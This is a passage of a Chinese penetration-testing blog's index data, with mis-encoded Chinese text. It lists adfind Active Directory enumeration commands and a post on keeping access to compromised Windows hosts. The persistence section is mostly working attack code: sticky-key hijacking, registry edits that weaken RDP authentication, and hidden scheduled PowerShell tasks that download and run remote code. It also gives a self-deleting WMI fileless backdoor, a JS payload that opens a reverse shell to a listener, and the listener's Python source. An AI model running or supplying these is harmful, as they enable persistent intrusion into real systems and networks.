çš„ä¸€äº›ä½¿ç”¨å®ä¾‹ï¼Œä¸»è¦æ˜¯å¯¹å·¥å…·å‚æ•°è¿›è¡Œä»‹ç»ã€‚æˆ‘ä»¬å¯ä»¥æ ¹æ®éœ€æ±‚ä¿®æ”¹å‘½ä»¤ï¼ŒæŸ¥ è¯¢æˆ‘ä»¬æ‰€å…³æ³¨çš„ä»»ä½•ä¿¡æ¯ã€‚æ¯”å¦‚æŸ¥è¯¢å·²æ§å‡­è¯æ‰€å±çš„ç»„ã€æŸ¥è¯¢ç‰¹å®šç»„çš„æˆå‘˜ã€æ ¹æ®è®¡ç®—æœºåæ¨æµ‹ç”¨æˆ·å¯ èƒ½æœ‰æƒé™çš„è®¡ç®—æœºç­‰ã€‚ #æŸ¥è¯¢åŸŸå†…æ‰€æœ‰ç”¨æˆ·è¯¦ç»†ä¿¡æ¯ adfind -h 10.1.26.128 -u company\\test -up Geekby -sc u:* #æŸ¥è¯¢åŸŸå†…ç‰¹å®šç”¨æˆ·è¯¦ç»†ä¿¡æ¯ adfind -h 10.1.26.128 -u company\\test -up Geekby -sc u:test #æŸ¥è¯¢åŸŸå†…ç‰¹å®šç”¨æˆ·ç‰¹å®šä¿¡æ¯(mail) adfind -h 10.1.26.128 -u company\\test -up Geekby -sc u:test mail #æŸ¥è¯¢åŸŸå†…æ‰€æœ‰ç”¨æˆ·dnä¿¡æ¯ adfind -h 10.1.26.128 -u company\\test -up Geekby -sc u:* -dn #æŸ¥è¯¢åŸŸå†…ç”¨æˆ·æ•°é‡ adfind -h 10.1.26.128 -u company\\test -up Geekby -sc u:* -c #æŸ¥è¯¢åŸŸå†…æ‰€æœ‰ç»„è¯¦ç»†ä¿¡æ¯ adfind -h 10.1.26.128 -u company\\test -up Geekby -sc g:* #æŸ¥è¯¢åŸŸå†…ç»„åå†…åŒ…å«â€œAdminâ€çš„æ‰€æœ‰ç»„è¯¦ç»†ä¿¡æ¯ adfind -h 10.1.26.128 -u company\\test -up Geekby -sc g:*Admin* #æŸ¥è¯¢åŸŸå†…æ‰€æœ‰OUè¯¦ç»†ä¿¡æ¯ adfind -h 10.1.26.128 -u company\\test -up Geekby -sc o:* #æŸ¥è¯¢åŸŸå†…æ‰€æœ‰è®¡ç®—æœºè¯¦ç»†ä¿¡æ¯ adfind -h 10.1.26.128 -u company\\test -up Geekby -sc c:* #æŸ¥è¯¢åŸŸå†…æ‰€æœ‰ç«™ç‚¹è¯¦ç»†ä¿¡æ¯ adfind -h 10.1.26.128 -u company\\test -up Geekby -sc site:* #æŸ¥è¯¢åŸŸå†…æ‰€æœ‰å­ç½‘è¯¦ç»†ä¿¡æ¯ adfind -h 10.1.26.128 -u company\\test -up Geekby -sc subnet:* #æŸ¥è¯¢åŸŸçš„ä¿¡ä»»å…³ç³» adfind -h 10.1.26.128 -u company\\test -up Geekby -sc trustdmp #æŸ¥è¯¢åŸŸå†…spnçš„è¯¦ç»†ä¿¡æ¯ adfind -h 10.1.26.128 -u company\\test -up Geekby -sc spn:* #æœç´¢ç¦ç”¨çš„ç”¨æˆ·dn adfind -h 10.1.26.128 -u company\\test -up Geekby -b DC=company,DC=com -f userAccountControl:AND:=514 -dn ","date":"2020-12-14","objectID":"/2020/12/ldap-%E5%8D%8F%E8%AE%AE/:5:2","tags":["LDAP","åè®®"],"title":"LDAP åè®®ç›¸å…³","uri":"/2020/12/ldap-%E5%8D%8F%E8%AE%AE/"},{"categories":null,"content":" welcome Welcome to my blog ","date":"2020-12-11","objectID":"/about/:0:0","tags":null,"title":"å…³äºæˆ‘","uri":"/about/"},{"categories":null,"content":"whoami IDï¼šGeekby Teamï¼šç§»åŠ¨äº’è”ç½‘å®‰å…¨æŠ€æœ¯å›½å®¶å·¥ç¨‹å®éªŒå®¤ å­¦å†ï¼šåŒ—é‚®ç¡•å£«åœ¨è¯» Web Security æ–¹å‘ CTFer å¦‚æœæœ‰ä»€ä¹ˆé—®é¢˜ï¼Œæ¬¢è¿æå‡ºæ¢è®¨~ ","date":"2020-12-11","objectID":"/about/:1:0","tags":null,"title":"å…³äºæˆ‘","uri":"/about/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"æƒé™ç»´æŒ","date":"2020-12-07","objectID":"/2020/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/","tags":["å†…ç½‘æ¸—é€","æƒé™ç»´æŒ"],"title":"æƒé™ç»´æŒ","uri":"/2020/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"æƒé™ç»´æŒ ","date":"2020-12-07","objectID":"/2020/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/:0:0","tags":["å†…ç½‘æ¸—é€","æƒé™ç»´æŒ"],"title":"æƒé™ç»´æŒ","uri":"/2020/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"1 æ“ä½œç³»ç»Ÿåé—¨ ","date":"2020-12-07","objectID":"/2020/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/:1:0","tags":["å†…ç½‘æ¸—é€","æƒé™ç»´æŒ"],"title":"æƒé™ç»´æŒ","uri":"/2020/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"1.1 ç²˜æ»é”®åé—¨ 1.1.1 ä¼ ç»Ÿæ–¹æ³• åœ¨ windows/system32 ä¸‹ï¼Œç›´æ¥å°† sethc ç¨‹åºæ›¿æ¢æˆ cmd.exe å¦‚æœç›®æ ‡æœºæ˜¯ windows vista ä»¥ä¸Šçš„ï¼Œå³ windows vista ä»¥åå‡ºçš„ç³»ç»Ÿï¼Œä¿®æ”¹ sethc ä¼šæç¤ºéœ€è¦ trustedinstaller æƒé™ï¼Œtrustedinstaller æ˜¯ä¸€ä¸ªå®‰å…¨æœºåˆ¶ï¼Œå³ç³»ç»Ÿçš„æœ€é«˜æƒé™ï¼Œæƒé™æ¯” administrator ç®¡ç†å‘˜é«˜. windows æƒé™åˆ†ä¸ºä¸‰ç§ä»ä½åˆ°é«˜ä¾æ¬¡æ˜¯ userï¼Œadministratorï¼Œsystemã€‚è€Œ trustedinstaller æ¯” administrator é«˜ä½†æ²¡æœ‰ system é«˜ï¼Œè¿™ä¹ˆåšçš„å¥½å¤„æ˜¯é¿å…äº†ä¸€äº›æ¶æ„è½¯ä»¶ä¿®æ”¹ç³»ç»Ÿæ–‡ä»¶çš„å¯èƒ½ï¼Œåå¤„å°±æ˜¯è‡ªå·±ä¸èƒ½ç›´æ¥æ“ä½œäº†ï¼Œæ‰€ä»¥è¦å…ˆä¿®æ”¹ sethc éœ€è¦å°†å…¶æ‰€æœ‰è€…æ”¹ä¸ºæ”¹ä¸ºæˆ‘ä»¬å½“å‰ç®¡ç†å‘˜ç”¨æˆ·ã€‚ åœ¨è¯¥æ‰€æœ‰è€…ä¹‹å‰ï¼Œç›´æ¥ç¼–è¾‘å…¶æƒé™éƒ½æ˜¯ç°è‰²çš„ï¼Œä¸èƒ½ä¿®æ”¹ï¼Œæœ‰äº†æ‰€æœ‰æƒä¹‹åï¼Œä¾¿å¯ä»¥ç¼–è¾‘å…¶æƒé™ï¼Œè¿™é‡Œéœ€è¦ç»™äºˆè‡ªå·±æƒé™ï¼Œå¦‚ä¸‹å›¾ï¼š è¿™æ—¶å¯ä»¥é‡å‘½åï¼Œä¹Ÿå¯ä»¥ç›´æ¥åˆ é™¤ï¼Œç„¶åå¤åˆ¶ cmd ä¿®æ”¹ sethc å³å¯ï¼Œç„¶ååœ¨é”å±æ²¡æœ‰å¯†ç æƒ…å†µä¸‹ï¼Œå¯ä»¥ç›´æ¥æŒ‰ 5 ä¸‹ shift è°ƒå‡º cmdï¼Œæ‰§è¡Œæ·»åŠ æ–°ç”¨æˆ·ç­‰æ“ä½œï¼Œå¦‚ä¸‹å›¾ï¼š 1.1.2 æ–°æ–¹æ³• æ–°æ–¹æ³•è®¾ç½®ç²˜æ»é”®åé—¨æ˜¯é€šè¿‡æ³¨å†Œè¡¨æ¥å®ç°ï¼Œæ•´ä½“çš„æ–¹æ³•æ€è·¯å°±æ˜¯é€šè¿‡ä¿®æ”¹æ³¨å†Œè¡¨çš„æ˜ åƒåŠ«æŒå’Œæ‰“å¼€å…¶è¿œç¨‹æ¡Œé¢æ¥å®ç°ã€‚ REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v Debugger /t REG_SZ /d \"C:\\windows\\system32\\cmd.exe\" å‘½ä»¤è¯´æ˜ï¼šreg add æ˜¯å‘æ³¨å†Œè¡¨æ·»åŠ è®°å½•ï¼Œåé¢è·Ÿçš„æ˜¯æ³¨å†Œè¡¨çš„ä½ç½®ï¼Œè¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ HKLM å®é™…ä¸Šæ˜¯ HKEY_LOCAL_MACHINE çš„ç¼©å†™ã€‚Image File Execution Option è¿™ä¸ªç›®å½•å°±æ˜¯ç”¨æ¥è®¾ç½®é•œåƒåŠ«æŒçš„ï¼Œè¦è¢«åŠ«æŒçš„å°±æ˜¯å‘½ä»¤ä¸­çš„ sethc ç²˜æ»é”®ç¨‹åºï¼Œéšåé€šè¿‡ /v æ¥æŒ‡å®šé”®åï¼Œè¿™ä¸ªé”®å debugger æ˜¯å›ºå®šçš„ï¼Œç„¶åé€šè¿‡ /t æ¥æŒ‡å®šç±»å‹ï¼Œå³ REG_SZ å­—ç¬¦ä¸²ç±»å‹ï¼Œæœ€åé€šè¿‡ /d æ¥æŒ‡å®šé”®çš„å€¼ï¼Œå³è¢«æ¶æ„æ›¿æ¢çš„ç¨‹åºï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬çš„ cmdã€‚ è®¾ç½®å®Œé•œåƒåŠ«æŒåå°±å·²ç»æœ‰äº†æˆ‘ä»¬æ—§æ–¹æ³•ä¸­ç›´æ¥æ›¿æ¢ sethc ç¨‹åºçš„æ•ˆæœï¼Œä½†æˆ‘ä»¬ä¸ºäº†æ–¹ä¾¿åˆ©ç”¨ï¼Œå¯ä»¥å¼€å¯ç›®æ ‡æœºçš„è¿œç¨‹æ¡Œé¢ï¼Œè¿™é‡Œæˆ‘ä»¬ä¹Ÿé€šè¿‡æ³¨å†Œè¡¨æ¥è®¾ç½®ä¸€ä¸‹ï¼Œéœ€è¦è®¾ç½®ä¸¤ä¸ªå‚æ•°ã€‚ 1.1.2.1 å…³é—­ RDP ç”¨æˆ·é‰´å®šé€‰é¡¹ ç¬¬ä¸€ä¸ªæ˜¯æŠŠè¿œç¨‹æ¡Œé¢é“¾æ¥çš„ç”¨æˆ·é‰´å®šé€‰é¡¹è®¾ç½®ä¸ºå…³é—­çŠ¶æ€ï¼Œå³å€¼ä¸º 0ï¼Œå‘½ä»¤è¡Œè¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼š REG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v UserAuthentication /t REG_DWORD /d 0 ç”¨æˆ·é‰´æƒå³ userauthentication è¿™ä¸ªå‚æ•°çš„ä½œç”¨ï¼š 0 çš„è¯´æ˜æ˜¯è¿›è¡Œè¿œç¨‹æ¡Œé¢å‰ä¸éœ€è¦ç”¨æˆ·èº«ä»½éªŒè¯ï¼Œè¿˜æ˜¯é»˜è®¤å€¼ï¼Œ1 è¯´æ˜çš„æ˜¯è¿›è¡Œè¿œç¨‹æ¡Œé¢å‰éœ€è¦è¿›è¡Œç”¨æˆ·èº«ä»½éªŒè¯ã€‚ä¸ºäº†æ›´å¥½çš„ç†è§£ï¼Œæˆ‘ä»¬æ¥çœ‹ä¸‹ä»–ä»¬çš„åŒºåˆ«ï¼Œä¸‹é¢æ˜¯ userauthentication ä¸º 1 çš„æ—¶å€™ï¼š å½“ userauthentication ä¸º 1 æ—¶å³è¿œç¨‹æ¡Œé¢å‰è¿›è¡Œç”¨æˆ·èº«ä»½éªŒè¯ï¼Œè¿™æ—¶å€™è¿œç¨‹é“¾æ¥è¾“å…¥ ip åä¼šè¦æ±‚è¾“å…¥ç”¨æˆ·åå’Œå¯†ç ï¼Œè¾“å…¥ç”¨æˆ·åä¸è¾“å…¥å¯†ç ç›´æ¥ç‚¹è¿æ¥ä¼šæç¤ºèº«ä»½éªŒè¯é”™è¯¯ã€‚è€Œå½“ userauthentication ä¸º 0 æ—¶ï¼Œå³è¿æ¥å‰ä¸è¿›è¡Œèº«ä»½éªŒè¯ï¼Œè¿™æ—¶å€™è¾“å…¥ç”¨æˆ·åä¸è¾“å…¥å¯†ç ç‚¹è¿æ¥ä¼šç›´æ¥åˆ°è¿œç¨‹æ¡Œé¢çš„é”å±é‚£ä¸€æ­¥ã€‚æ‰€ä»¥è®¾ç½®ä¸º 0 æˆ‘ä»¬å¯ä»¥ç›´æ¥åˆ°ç›®æ ‡çš„é”å±ç„¶åè°ƒèµ· cmdã€‚ æ³¨ï¼šåœ¨ windows server 2012 ä¸Šé»˜è®¤ä¸º 0 1.1.2.2 æ›´æ”¹ RDP å®‰å…¨å±‚è®¾ç½® ç¬¬äºŒä¸ªæ˜¯æŠŠè¿œç¨‹æ¡Œé¢è¿æ¥çš„å®‰å…¨å±‚è®¾ç½®ä¸º 0ï¼Œå‘½ä»¤è¡Œè¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼š REG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v SecurityLayer /t REG_DWORD /d 0 0 å°±æ˜¯è¿æ¥å‰ä½¿ç”¨ RDP åè®®è¿›è¡Œèº«ä»½éªŒè¯ï¼ŒRDP å³è¿œç¨‹æ¡Œé¢è¿æ¥ï¼Œå¯ä»¥ç®€å•ç†è§£ä¸ºå°±æ˜¯å…³é—­éªŒè¯ã€‚1 æ˜¯æŒ‡åœ¨è¿æ¥å‰ä¸¤ç«¯åå•†æ¥è¿›è¡Œèº«ä»½éªŒè¯ï¼Œè¿™ä¸ªæ˜¯é»˜è®¤å€¼ã€‚2 å°±æ˜¯ä½¿ç”¨ tls åè®®æ¥è¿›è¡Œã€‚æ¥çœ‹ä¸‹ 0 å’Œ 1 çš„åŒºåˆ«ï¼š åœ¨ userauthentication ç”¨æˆ·é‰´æƒä¸º 0 çš„æƒ…å†µä¸‹ï¼Œsecuritylayer å®‰å…¨å±‚ä¸º 1 çš„æ—¶å€™æ˜¯ç‚¹å‡»è¿æ¥åè¾“å…¥ç”¨æˆ·åç„¶åå†ç‚¹è¿æ¥åˆ°ç›®æ ‡æ¡Œé¢ï¼Œè€ŒæŠŠ securitylayer æ”¹ä¸º 0 æ—¶ï¼Œç‚¹å‡»è¿æ¥ï¼Œä¼šç›´æ¥åˆ°ç”¨æˆ·çš„é”å±æ¡Œé¢ï¼Œçœå»äº†è¾“å…¥å‡­è¯é‚£ä¸€æ­¥ã€‚æ‰€ä»¥æˆ‘ä»¬è®¾ç½®ä¸º 0ï¼Œå¯ä»¥ç›´æ¥è·³åˆ°é”å±æ¡Œé¢è°ƒ cmdã€‚ æ³¨ï¼šåœ¨ windows server 2012 ä¸Šé»˜è®¤ä¸º 1 1.1.3 æµ‹è¯•ç»“æœ ç»è¿‡æµ‹è¯•ï¼Œåœ¨ win10 ä¸Š RDP è¿æ¥æ–­å¼€æ—¶ msf çš„ä¼šè¯ç«‹åˆ»æ–­å¼€ï¼Œåœ¨ windows server 2008 ä¸ŠæˆåŠŸã€‚ ","date":"2020-12-07","objectID":"/2020/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/:1:1","tags":["å†…ç½‘æ¸—é€","æƒé™ç»´æŒ"],"title":"æƒé™ç»´æŒ","uri":"/2020/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"1.2 æ³¨å†Œè¡¨åé—¨ Runï¼šè¯¥é¡¹ä¸‹çš„é”®å€¼å³ä¸ºå¼€æœºå¯åŠ¨é¡¹ ä½ç½®ï¼š \\HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run msf ä¸‹çš„å‘½ä»¤ï¼š use exploit/windows/local/persistence ","date":"2020-12-07","objectID":"/2020/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/:1:2","tags":["å†…ç½‘æ¸—é€","æƒé™ç»´æŒ"],"title":"æƒé™ç»´æŒ","uri":"/2020/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"1.3 è®¡åˆ’ä»»åŠ¡åé—¨ schtasks /Create åˆ›å»ºæ–°ä»»åŠ¡ã€‚ /Delete åˆ é™¤è®¡åˆ’ä»»åŠ¡ã€‚ /Query æ˜¾ç¤ºæ‰€æœ‰è®¡åˆ’ä»»åŠ¡ã€‚ /Change æ›´æ”¹è®¡åˆ’ä»»åŠ¡å±æ€§ã€‚ /Run æŒ‰éœ€è¿è¡Œè®¡åˆ’ä»»åŠ¡ã€‚ /End ä¸­æ­¢å½“å‰æ­£åœ¨è¿è¡Œçš„è®¡åˆ’ä»»åŠ¡ã€‚ /ShowSid æ˜¾ç¤ºä¸è®¡åˆ’çš„ä»»åŠ¡åç§°ç›¸åº”çš„å®‰å…¨æ ‡è¯†ç¬¦ã€‚ # schtasks å‘½ä»¤ # æ¯å¤©æ™šä¸Š 03:30 å®šæ—¶æ‰§è¡Œ schtasks /create /tn \"TimedTask1\" /tr C:\\Users\\Administrator\\Desktop\\TimedTask\\Run.bat /sc DAILY /st 03:30 # statement A # æŸ¥è¯¢åˆ›å»ºçš„ä»»åŠ¡ schtasks /query /tn TimedTask1 /v # ç«‹å³è¿è¡Œåˆ›å»ºçš„ä»»åŠ¡ schtasks /run /tn TimedTask1 # åˆ é™¤ä»»åŠ¡ schtasks /delete /tn TimedTask1 #(X64) - On System Start schtasks /create /tn PentestLab /tr \"c:\\windows\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://10.0.2.21:8080/ZPWLywg'''))'\" /sc onstart /ru System #(X64) - On User Idle (30mins) schtasks /create /tn PentestLab /tr \"c:\\windows\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://10.0.2.21:8080/ZPWLywg'''))'\" /sc onidle /i 30 #(X86) - On User Login schtasks /create /tn PentestLab /tr \"c:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://10.0.2.21:8080/ZPWLywg'''))'\" /sc onlogon /ru System #(X86) - On System Start schtasks /create /tn PentestLab /tr \"c:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://10.0.2.21:8080/ZPWLywg'''))'\" /sc onstart /ru System #(X86) - On User Idle (30mins) schtasks /create /tn PentestLab /tr \"c:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://10.0.2.21:8080/ZPWLywg'''))'\" /sc onidle /i 30 ","date":"2020-12-07","objectID":"/2020/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/:1:3","tags":["å†…ç½‘æ¸—é€","æƒé™ç»´æŒ"],"title":"æƒé™ç»´æŒ","uri":"/2020/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"1.4 wmi æ— æ–‡ä»¶åé—¨ evil3.vbs -\u003e æ¶æ„VBSè„šæœ¬ã€‚åˆ›å»ºäº‹ä»¶è¿‡æ»¤å™¨ï¼Œæ•è·è´¦æˆ·æˆåŠŸç™»é™†çš„äº‹ä»¶ï¼›åˆ›å»ºæ´»åŠ¨è„šæœ¬äº‹ä»¶æ¶ˆè´¹è€…ï¼Œæ•è·åˆ°äº‹ä»¶åæ‰§è¡Œè¿œç¨‹è„šæœ¬pnc.js;ç»‘å®šè¿‡æ»¤å™¨å’Œæ¶ˆè´¹è€…ã€‚ nslink=\"winmgmts:\\\\.\\root\\subscription:\" qstr=\"select * from __InstanceCreationEvent within 5 \" 'æ¯5ç§’æŸ¥è¯¢ä¸€æ¬¡â€œå®ä¾‹åˆ›å»ºäº‹ä»¶â€' qstr=qstr\u0026\"where targetinstance isa 'win32_NTLogEvent' and \" qstr=qstr\u0026\"targetinstance.EventCode='4624' \" 'å®ä¾‹åæ˜¯win32_NTLogEvent' set evtflt=getobject(nslink\u0026\"__EventFilter\").spawninstance_ 'åˆ›å»ºäº‹ä»¶è¿‡æ»¤å™¨' evtflt.name=\"filtP1\" 'å®šä¹‰è¿‡æ»¤å™¨çš„åå­—' evtflt.EventNameSpace=\"root\\cimv2\" evtflt.query=qstr 'å®šä¹‰æŸ¥è¯¢è¯­å¥' evtflt.querylanguage=\"wql\" 'å®šä¹‰æŸ¥è¯¢è¯­è¨€(åªèƒ½æ˜¯wql)' set fltpath=evtflt.put_ 'æ³¨å†Œè¿‡æ»¤å™¨ï¼Œè¿”å›å…¶é“¾æ¥' set asec=getobject(nslink\u0026\"ActiveScriptEventConsumer\").spawninstance_ 'åˆ›å»ºâ€œæ´»åŠ¨è„šæœ¬äº‹ä»¶æ¶ˆè´¹è€…â€' asec.name=\"consP1\" 'å®šä¹‰æ¶ˆè´¹è€…çš„åå­—' asec.scriptingengine=\"JScript\" 'å®šä¹‰è„šæœ¬è¯­è¨€ asec.ScriptText=\"GetObject(\"\"script:http://192.168.41.1:8080/pnc.js\"\")\" set asecpath=asec.put_ 'æ³¨å†Œæ¶ˆè´¹è€…ï¼Œè¿”å›å…¶é“¾æ¥' set fcbnd=getobject(nslink\u0026\"__FilterToConsumerBinding\").spawninstance_ 'åˆ›å»ºè¿‡æ»¤å™¨å’Œæ¶ˆè´¹è€…çš„ç»‘å®š' fcbnd.filter=fltpath.path 'æŒ‡å®šè¿‡æ»¤å™¨' fcbnd.consumer=asecpath.path 'æŒ‡å®šæ¶ˆè´¹è€…' fcbnd.put_ 'æ‰§è¡Œç»‘å®š' dim fso set fso = CreateObject(\"Scripting.FileSystemObject\") evilname=left(wscript.scriptfullname,instrrev(wscript.scriptfullname,\"\\\")) evilname=evilname\u0026 fso.GetFile(Wscript.scriptfullname).name fso.DeleteFile(evilname) 'vbsåˆ é™¤è‡ªå·± pnc.js -\u003e æœåŠ¡ç«¯æ¶æ„è„šæœ¬ã€‚ä¸‹è½½powercat.ps1ï¼Œå¹¶ä½¿ç”¨å…¶è¿”å›shellã€‚ \u003c?xml version=\"1.0\"?\u003e \u003cpackage\u003e \u003ccomponent id=\"testCalc\"\u003e \u003cscript language=\"JScript\"\u003e var r = new ActiveXObject(\"WScript.Shell\").Run(\"powershell IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.41.1:8080/powercat-master/powercat.ps1');powercat -c 192.168.41.1 -p 6999 -e cmd\"); \u003c/script\u003e \u003c/component\u003e \u003c/package\u003e shell_server.py -\u003e æœåŠ¡ç«¯ç›‘å¬shellçš„è„šæœ¬ã€‚ import socket import re pattern = re.compile(r'[A-Z]:\\\\.*?\u003e') def recv_end(the_socket): total_data = [] data = b'' while True: data = the_socket.recv(1024) #print(data) if not data: raise ConnectionAbortedError data = str(data, encoding = 'gbk') total_data.append(data) if pattern.search(data, re.M): break if len(total_data) \u003e 1: last_pair = total_data[-2] + total_data[-1] if pattern.search(last_pair, re.M): break return ''.join(total_data) # å»ºç«‹ä¸€ä¸ªæœåŠ¡ç«¯ server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) port = 6999 server.bind(('192.168.41.1', port)) #ç»‘å®šè¦ç›‘å¬çš„ç«¯å£ server.listen(5) #å¼€å§‹ç›‘å¬ è¡¨ç¤ºå¯ä»¥ä½¿ç”¨äº”ä¸ªé“¾æ¥æ’é˜Ÿ while True:# connå°±æ˜¯å®¢æˆ·ç«¯é“¾æ¥è¿‡æ¥è€Œåœ¨æœåŠ¡ç«¯ä¸ºæœŸç”Ÿæˆçš„ä¸€ä¸ªé“¾æ¥å®ä¾‹ print('------------Listening on {}------------'.format(port)) conn, addr = server.accept() #ç­‰å¾…é“¾æ¥,å¤šä¸ªé“¾æ¥çš„æ—¶å€™å°±ä¼šå‡ºç°é—®é¢˜,å…¶å®è¿”å›äº†ä¸¤ä¸ªå€¼ print(conn) while True: try: se = input(recv_end(conn)) if not se: se = '\\r\\n' #print(bytes(se, encoding = \"utf8\")) conn.send(bytes(se, encoding = 'utf-8')) #ç„¶åå†å‘é€æ•°æ® except BaseException as e: print('\\n' + addr[0] + ':' + str(addr[1]) + 'å·²å…³é—­') break conn.close() # å…³é—­è¿æ¥ powercat.ps1 -\u003e powershellç‰ˆnetcatã€‚(https://github.com/besimorhino/powercat) clean.ps1 -\u003e æ¸…é™¤evil3.vbsåˆ›å»ºçš„è¿‡æ»¤å™¨ã€æ¶ˆè´¹è€…ã€ç»‘å®šå™¨ã€‚ #Filter Get-WMIObject -Namespace root\\Subscription -Class __EventFilter -Filter \"Name='filtP1'\" | Remove-WmiObject -Verbose #Consumer Get-WMIObject -Namespace root\\Subscription -Class CommandLineEventConsumer -Filter \"Name='consP1'\" | Remove-WmiObject -Verbose #Binding Get-WMIObject -Namespace root\\Subscription -Class __FilterToConsumerBinding -Filter \"__Path LIKE '%filtP1%'\" | Remove-WmiObject -Verbose ","date":"2020-12-07","objectID":"/2020/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/:1:4","tags":["å†…ç½‘æ¸—é€","æƒé™ç»´æŒ"],"title":"æƒé™ç»´æŒ","uri":"/2020/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"2 åŸŸæ§åé—¨ ","date":"2020-12-07","objectID":"/2020/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/:2:0","tags":["å†…ç½‘æ¸—é€","æƒé™ç»´æŒ"],"title":"æƒé™ç»´æŒ","uri":"/2020/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"2.1 DSRM åé—¨ DSRM(Directory Services Restore Mode) æ˜¯ Windows åŸŸç¯å¢ƒä¸­åŸŸæ§åˆ¶å™¨çš„å®‰å…¨æ¨¡å¼å¯åŠ¨é€‰é¡¹ã€‚æ¯ä¸ªåŸŸæ§åˆ¶å™¨æœ‰ä¸€ä¸ªæœ¬åœ°ç®¡ç†å‘˜è´¦å·(ä¹Ÿå°±æ˜¯ DSRM è´¦å·)ã€‚DSRM çš„ç”¨é€”æ˜¯:å…è®¸ç®¡ç†å‘˜åœ¨åŸŸç¯å¢ƒå‡ºç°æ•…éšœæˆ–å´©æºƒæ—¶è¿˜åŸã€ä¿®å¤ã€é‡å»ºæ´»åŠ¨ç›®å½•æ•°æ®åº“ï¼Œä½¿åŸŸç¯å¢ƒçš„è¿è¡Œæ¢å¤æ­£å¸¸ã€‚åœ¨åŸŸç¯å¢ƒåˆ›å»ºåˆæœŸï¼ŒDSRM çš„å¯†ç éœ€è¦åœ¨å®‰è£… DC æ—¶è®¾ç½®ï¼Œä¸”å¾ˆå°‘ä¼šè¢«é‡ç½®ã€‚ä¿®æ”¹ DSRM å¯†ç æœ€åŸºæœ¬çš„æ–¹æ³•æ˜¯åœ¨ DC ä¸Šè¿ ntdsutil è¡Œå‘½ä»¤ã€‚ åœ¨æ¸—é€æµ‹è¯•ä¸­ï¼Œå¯ä»¥ä½¿ç”¨ DSRM è´¦å·å¯¹åŸŸç¯å¢ƒè¿›è¡ŒæŒä¹…åŒ–æ“ä½œã€‚å¦‚æœåŸŸæ§åˆ¶å™¨çš„ç³»ç»Ÿç‰ˆæœ¬ä¸º Windows Server 2008ï¼Œåˆ™éœ€è¦å®‰è£… KB96132 è¡¥ä¸æ‰å¯ä»¥ä½¿ç”¨æŒ‡å®šåŸŸè´¦å·çš„å¯†ç å¯¹ DSRM çš„å¯†ç è¿›è¡ŒåŒæ­¥ã€‚åœ¨ Windows Server 2008 ä»¥åç‰ˆæœ¬çš„ç³»ç»Ÿä¸­ä¸éœ€è¦å®‰è£…æ­¤è¡¥ä¸ã€‚å¦‚æœåŸŸæ§åˆ¶å™¨çš„ç³»ç»Ÿç‰ˆæœ¬ä¸º Windows Server 2003ï¼Œåˆ™ä¸èƒ½ä½¿ç”¨è¯¥æ–¹æ³•è¿›è¡ŒæŒä¹…åŒ–æ“ä½œã€‚ æˆ‘ä»¬çŸ¥é“ï¼Œæ¯ä¸ª DC éƒ½æœ‰æœ¬åœ°ç®¡ç†å‘˜(administrator)è´¦å·å’Œå¯†ç ã€‚DSRM è´¦å·å¯ä»¥ä½œä¸º DC çš„æœ¬åœ°ç®¡ç†å‘˜ç”¨æˆ·ï¼Œé€šè¿‡ç½‘ç»œè¿æ¥ DCï¼Œè¿›è€Œæ§åˆ¶ DCã€‚ åœ¨ DC ä¸Šï¼ŒDSRM è´¦å·çš„è¡¨ç°å½¢å¼æ˜¯æœ¬åœ°çš„ administrator ç”¨æˆ·ï¼Œä¹Ÿå°±æ˜¯è¯´æœ¬åœ° administrator 